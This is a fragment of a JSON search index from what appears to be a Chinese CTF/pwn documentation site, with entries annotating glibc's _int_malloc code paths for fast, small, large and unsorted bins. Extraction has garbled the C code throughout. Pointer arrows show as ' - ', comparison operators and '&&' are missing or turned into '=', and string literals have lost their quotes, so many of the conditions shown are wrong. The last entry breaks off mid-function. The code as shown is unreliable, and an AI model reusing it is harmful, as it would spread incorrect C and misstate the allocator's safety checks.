            "text": "\u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002       /*         If the size qualifies as a fastbin, first check corresponding bin.         This code is safe to execute even if av is not yet initialized, so we         can try it without checking, which saves some time on this fast path.       */ \n\n     if   (( unsigned   long )   ( nb )   =   ( unsigned   long )   ( get_max_fast ()))   { \n         // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 \n         idx               =   fastbin_index ( nb ); \n         // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 \n         mfastbinptr   * fb   =   fastbin ( av ,   idx ); \n         mchunkptr      pp   =   * fb ; \n         // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c \n         do   { \n             victim   =   pp ; \n             if   ( victim   ==   NULL )   break ; \n         }   while   (( pp   =   catomic_compare_and_exchange_val_acq ( fb ,   victim - fd , \n                                                             victim ))   !=   victim ); \n         // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk \n         if   ( victim   !=   0 )   { \n             // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 \n             // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 \n             // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 \n             if   ( __builtin_expect ( fastbin_index ( chunksize ( victim ))   !=   idx ,   0 ))   { \n                 errstr   =   malloc(): memory corruption (fast) ; \n             errout : \n                 malloc_printerr ( check_action ,   errstr ,   chunk2mem ( victim ),   av ); \n                 return   NULL ; \n             } \n             // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 \n             check_remalloced_chunk ( av ,   victim ,   nb ); \n             // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f \n             void   * p   =   chunk2mem ( victim ); \n             // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n             alloc_perturb ( p ,   bytes ); \n             return   p ; \n         } \n     }", 
            "title": "fast bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#small-bin", 
            "text": "\u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b       /*         If a small request, check regular bin.  Since these  smallbins         hold one size each, no searching within bins is necessary.         (For a large request, we need to wait until unsorted chunks are         processed to find best fit. But for small ones, fits are exact         anyway, so we can check now, which is faster.)       */ \n\n     if   ( in_smallbin_range ( nb ))   { \n         // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 \n         idx   =   smallbin_index ( nb ); \n         // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 \n         bin   =   bin_at ( av ,   idx ); \n         // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \n         // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 \n         // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 \n         if   (( victim   =   last ( bin ))   !=   bin )   { \n             // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 \n             if   ( victim   ==   0 )   /* initialization check */ \n                 // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 \n                 malloc_consolidate ( av ); \n             // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk \n             else   { \n                 // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 \n                 bck   =   victim - bk ; \n                 // \u68c0\u67e5 bck- fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 \n                 if   ( __glibc_unlikely ( bck - fd   !=   victim ))   { \n                     errstr   =   malloc(): smallbin double linked list corrupted ; \n                     goto   errout ; \n                 } \n                 // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d \n                 set_inuse_bit_at_offset ( victim ,   nb ); \n                 // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 \n                 bin - bk   =   bck ; \n                 bck - fd   =   bin ; \n                 // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 \n                 if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             } \n         } \n     }", 
            "title": "small bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#large-bin", 
            "text": "\u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684chunk\uff0c\u800c\u662f\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1malloc_state\u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662fptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002       /*         If this is a large request, consolidate fastbins before continuing.         While it might look excessive to kill all fastbins before         even seeing if there is space available, this avoids         fragmentation problems normally associated with fastbins.         Also, in practice, programs tend to have runs of either small or         large requests, but less often mixtures, so consolidation is not         invoked all that often in most programs. And the programs that         it is called frequently in otherwise tend to fragment.       */ \n\n     else   { \n         // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 \n         idx   =   largebin_index ( nb ); \n         // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin  \n         if   ( have_fastchunks ( av ))   malloc_consolidate ( av ); \n     }", 
            "title": "large bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_7", 
            "text": "\u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk\u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662flarge chunk  \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002  \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c   \u5c1d\u8bd5\u4ece unsorted bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58  \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58  \u5c1d\u8bd5\u4ece top  chunk \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u5185\u5b58   \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914dsmall bin chunk\u3002       /*         Process recently freed or remaindered chunks, taking one only if         it is exact fit, or, if this a small request, the chunk is remainder from         the most recent non-exact fit.  Place other traversed chunks in         bins.  Note that this step is the only place in any routine where         chunks are placed in bins.         The outer loop here is needed because we might not realize until         near the end of malloc that we should have consolidated, so must         do so and retry. This happens at most once, and only when we would         otherwise need to expand memory to service a  small  request.       */ \n\n     for   (;;)   { \n         int   iters   =   0 ;", 
            "title": "\u5927\u5faa\u73af"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#unsort-bin", 
            "text": "\u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8esmall bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002  \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002           // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a \n         // First In First Out \n         while   (( victim   =   unsorted_chunks ( av ) - bk )   !=   unsorted_chunks ( av ))   { \n             // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \n             // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \n             bck   =   victim - bk ; \n             // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 \n             // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K \n             if   ( __builtin_expect ( chunksize_nomask ( victim )   =   2   *   SIZE_SZ ,   0 )   || \n                 __builtin_expect ( chunksize_nomask ( victim )     av - system_mem ,   0 )) \n                 malloc_printerr ( check_action ,   malloc(): memory corruption , \n                                 chunk2mem ( victim ),   av ); \n             // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 \n             size   =   chunksize ( victim );", 
            "title": "unsort bin \u904d\u5386"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#small-request", 
            "text": "\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk\uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u591f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f               /*                 If a small request, try to use last remainder if it is the                 only chunk in unsorted bin.  This helps promote locality for                 runs of consecutive small requests. This is the only                 exception to best-fit, and applies only when there is                 no exact fit for a small chunk.               */ \n\n             if   ( in_smallbin_range ( nb )     bck   ==   unsorted_chunks ( av )   \n                 victim   ==   av - last_remainder   \n                 ( unsigned   long )   ( size )     ( unsigned   long )   ( nb   +   MINSIZE ))   { \n                 /* split and reattach remainder */ \n                 // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f \n                 remainder_size            =   size   -   nb ; \n                 // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e \n                 remainder                 =   chunk_at_offset ( victim ,   nb ); \n                 // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 \n                 unsorted_chunks ( av ) - bk   =   unsorted_chunks ( av ) - fd   =   remainder ; \n                 // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder \n                 av - last_remainder                                  =   remainder ; \n                 // \u66f4\u65b0last remainder\u7684\u6307\u9488 \n                 remainder - bk   =   remainder - fd   =   unsorted_chunks ( av ); \n                 if   ( ! in_smallbin_range ( remainder_size ))   { \n                     remainder - fd_nextsize   =   NULL ; \n                     remainder - bk_nextsize   =   NULL ; \n                 } \n                 // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0c \n                 set_head ( victim ,   nb   |   PREV_INUSE   | \n                                      ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n                 // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 \n                 set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n                 // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 \n                 set_foot ( remainder ,   remainder_size ); \n                 // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             }", 
            "title": "small request"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_8", 
            "text": "/* remove from unsorted list */ \n             unsorted_chunks ( av ) - bk   =   bck ; \n             bck - fd                   =   unsorted_chunks ( av );", 
            "title": "\u521d\u59cb\u53d6\u51fa"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#exact-fit", 
            "text": "\u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002               /* Take now instead of binning if exact fit */ \n             if   ( size   ==   nb )   { \n                 set_inuse_bit_at_offset ( victim ,   size ); \n                 if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 void   * p   =   chunk2mem ( victim ); \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             }", 
            "title": "exact fit"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#place-chunk-in-small-bin", 
            "text": "\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002               /* place chunk in bin */ \n\n             if   ( in_smallbin_range ( size ))   { \n                 victim_index   =   smallbin_index ( size ); \n                 bck            =   bin_at ( av ,   victim_index ); \n                 fwd            =   bck - fd ;", 
            "title": "place chunk in small bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#place-chunk-in-large-bin", 
            "text": "\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002               }   else   { \n                 // large bin\u8303\u56f4 \n                 victim_index   =   largebin_index ( size ); \n                 bck            =   bin_at ( av ,   victim_index ); \n                 fwd            =   bck - fd ; \n\n                 /* maintain large bins in sorted order */ \n                 /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002                     \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c                     \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c                     \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ \n                 // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a \n                 if   ( fwd   !=   bck )   { \n                     /* Or with inuse bit to speed comparisons */ \n                     // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684chunk\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 \n                     size   |=   PREV_INUSE ; \n                     /* if smaller than smallest, bypass loop below */ \n                     // bck-bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 \n                     // \u5982\u679c\u904d\u5386\u7684chunk\u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 \n                     // \u5224\u65ad bck- bk \u662f\u4e0d\u662f\u5728 main arena\u3002 \n                     assert ( chunk_main_arena ( bck - bk )); \n                     if   (( unsigned   long )   ( size )   \n                         ( unsigned   long )   chunksize_nomask ( bck - bk ))   { \n                         // \u4ee4 fwd \u6307\u5411 bin \u5934 \n                         fwd   =   bck ; \n                         // \u4ee4 bck \u6307\u5411 bin \u5c3e \n                         bck   =   bck - bk ; \n                         // victim \u7684 fd_nextsize \u6307\u5411\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \n                         victim - fd_nextsize   =   fwd - fd ; \n                         // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk \u6307\u5411\u7684bk_nextsize \n                         victim - bk_nextsize   =   fwd - fd - bk_nextsize ; \n                         // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim \n                         // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim \n                         fwd - fd - bk_nextsize   = \n                             victim - bk_nextsize - fd_nextsize   =   victim ; \n                     }   else   { \n                         // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk  \n                         // \u5224\u65ad fwd \u662f\u5426\u5728 main arena \n                         assert ( chunk_main_arena ( fwd )); \n                         // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk \n                         while   (( unsigned   long )   size     chunksize_nomask ( fwd ))   { \n                             fwd   =   fwd - fd_nextsize ; \n                             assert ( chunk_main_arena ( fwd )); \n                         } \n                         // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c \n                         // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 \n                         if   (( unsigned   long )   size   == \n                             ( unsigned   long )   chunksize_nomask ( fwd )) \n                             /* Always insert in the second position.  */ \n                             fwd   =   fwd - fd ; \n                         else   { \n                             // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 \n                             // \u90a3\u4e48\u4e45\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 \n                             victim - fd_nextsize                =   fwd ; \n                             victim - bk_nextsize                =   fwd - bk_nextsize ; \n                             fwd - bk_nextsize                   =   victim ; \n                             victim - bk_nextsize - fd_nextsize   =   victim ; \n                         } \n                         bck   =   fwd - bk ; \n                     } \n                 }   else \n                     // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 \n                     victim - fd_nextsize   =   victim - bk_nextsize   =   victim ; \n             }", 
            "title": "place chunk in large bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_9", 
            "text": "// \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bk -- victim -- fwd\u3002 \n             mark_bin ( av ,   victim_index ); \n             victim - bk   =   bck ; \n             victim - fd   =   fwd ; \n             fwd - bk      =   victim ; \n             bck - fd      =   victim ;", 
            "title": "\u6700\u7ec8\u53d6\u51fa"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#while", 
            "text": "while \u6700\u591a\u8fed\u4ee310000\u6b21\u540e\u9000\u51fa\u3002               //   ##define MAX_ITERS 10000 \n             if   ( ++ iters   =   MAX_ITERS )   break ; \n         }", 
            "title": "while \u8fed\u4ee3\u6b21\u6570"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#large-chunk", 
            "text": "\u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3asmall bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684chunk\u3002  \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002           /*             If a large request, scan through the chunks of current bin in             sorted order to find smallest that fits.  Use the skip list for this.           */ \n         if   ( ! in_smallbin_range ( nb ))   { \n             bin   =   bin_at ( av ,   idx ); \n             /* skip scan if empty or largest chunk is too small */ \n             // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 \n             // first(bin)=bin- fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk \n             if   (( victim   =   first ( bin ))   !=   bin   \n                 ( unsigned   long )   chunksize_nomask ( victim )   = \n                     ( unsigned   long )   ( nb ))   { \n                 // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk \n                 victim   =   victim - bk_nextsize ; \n                 while   ((( unsigned   long )   ( size   =   chunksize ( victim ))   \n                         ( unsigned   long )   ( nb ))) \n                     victim   =   victim - bk_nextsize ; \n\n                 /* Avoid removing the first entry for a size so that the skip                     list does not have to be rerouted.  */ \n                 // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk \n                 // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize \n                 //  \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 \n                 if   ( victim   !=   last ( bin )   \n                     chunksize_nomask ( victim )   ==   chunksize_nomask ( victim - fd )) \n                     victim   =   victim - fd ; \n                 // \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f \n                 remainder_size   =   size   -   nb ; \n                 // \u8fdb\u884cunlink \n                 unlink ( av ,   victim ,   bck ,   fwd ); \n\n                 /* Exhaust */ \n                 // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 \n                 // \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f \n                 if   ( remainder_size     MINSIZE )   { \n                     set_inuse_bit_at_offset ( victim ,   size ); \n                     if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 } \n                 /* Split */ \n                 //  \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 \n                 else   { \n                     // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder \n                     remainder   =   chunk_at_offset ( victim ,   nb ); \n                     /* We cannot assume the unsorted list is empty and therefore                         have to perform a complete insert here.  */ \n                     // \u63d2\u5165unsorted bin\u4e2d \n                     bck   =   unsorted_chunks ( av ); \n                     fwd   =   bck - fd ; \n                     // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 \n                     if   ( __glibc_unlikely ( fwd - bk   !=   bck ))   { \n                         errstr   =   malloc(): corrupted unsorted chunks ; \n                         goto   errout ; \n                 